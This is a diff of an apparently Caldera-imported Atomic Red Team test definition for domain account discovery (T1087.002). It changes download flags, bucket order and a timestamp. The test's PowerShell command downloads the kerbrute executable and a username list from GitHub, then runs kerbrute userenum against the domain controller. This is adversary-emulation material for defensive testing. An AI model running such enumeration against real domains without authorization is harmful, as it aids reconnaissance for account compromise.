@@ -12,21 +12,21 @@
         command: 'if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit
           0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction ignore -Force | Out-Null; invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
-          -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"; fi; if
-          (test-path "PathToAtomicsFolder\..\ExternalPayloads\username.txt"){exit
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe" -UseBasicParsing;
+          fi; if (test-path "PathToAtomicsFolder\..\ExternalPayloads\username.txt"){exit
           0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
           -ErrorAction ignore -Force | Out-Null; invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"
-          -outfile "PathToAtomicsFolder\..\ExternalPayloads\username.txt"; fi; cd
-          "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe userenum -d $env:USERDOMAIN
-          --dc $env:UserDnsDomain "PathToAtomicsFolder\..\ExternalPayloads\username.txt"'
+          -outfile "PathToAtomicsFolder\..\ExternalPayloads\username.txt" -UseBasicParsing;
+          fi; cd "PathToAtomicsFolder\..\ExternalPayloads"; .\kerbrute.exe userenum
+          -d $env:USERDOMAIN --dc $env:UserDnsDomain "PathToAtomicsFolder\..\ExternalPayloads\username.txt"'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - t1087.002
+  - atomic-red-team
   - discovery
   author: Atomic Red Team
   additional_info:
@@ -51,7 +51,7 @@
         -ErrorAction ignore -Force | Out-Null
 
         invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe"
-        -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
+        -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe" -UseBasicParsing
 
         '
     - description: 'username text file must exist in PathToAtomicsFolder\..\ExternalPayloads.
@@ -65,9 +65,9 @@
         -ErrorAction ignore -Force | Out-Null
 
         invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true"
-        -outfile "PathToAtomicsFolder\..\ExternalPayloads\username.txt"
+        -outfile "PathToAtomicsFolder\..\ExternalPayloads\username.txt" -UseBasicParsing
 
         '
     technique_created: '2020-02-21T21:08:26.480Z'
     atomic_guid: f450461c-18d1-4452-9f0d-2c42c3f08624
-    import_timestamp: '2026-10-20T07:08:30.494944Z'
+    import_timestamp: '2026-10-21T07:01:52.369974Z'
